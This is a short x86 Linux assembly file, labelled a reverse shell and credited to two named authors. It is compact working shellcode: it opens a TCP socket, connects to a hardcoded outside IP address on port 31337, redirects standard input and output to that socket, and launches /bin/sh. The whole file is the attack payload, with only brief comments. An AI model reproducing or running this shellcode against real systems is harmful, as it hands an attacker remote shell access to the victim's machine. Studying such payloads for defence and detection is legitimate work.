;Author: degrigis + erickson
;Reverse shell

section .text
global _start

_start:
push BYTE 0x66  ;socketcall is the syscall number 102
pop eax
xor edx,edx
xor ebx,ebx
inc ebx ;type of socket SYS_SOCKET
push edx
push BYTE 0x1 ;SOCK_STREAM
push BYTE 0x2 ;AF_INET
mov ecx,esp
int 0x80  ;create the socket, eax contains now the socket descriptor
xchg esi,eax

push BYTE 0x66
pop eax
inc ebx
push DWORD 0xbbe1bb25 ;address 37.187.225.187
push WORD 0x697a ;port 31337
push WORD bx
mov ecx,esp
push BYTE 16
push ecx
push esi
mov ecx,esp
inc ebx  ;SYS_CONNECT
int 0x80  ;socket connected!

xchg eax,ebx
push BYTE 0x2
pop ecx
dup_loop: ;redirect all file descript on the socket
mov BYTE al,0x3F
int 0x80
dec ecx
jns dup_loop

mov BYTE al,11 ;execve
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
push edx
mov edx,esp
push ebx
mov ecx,esp
int 0x80



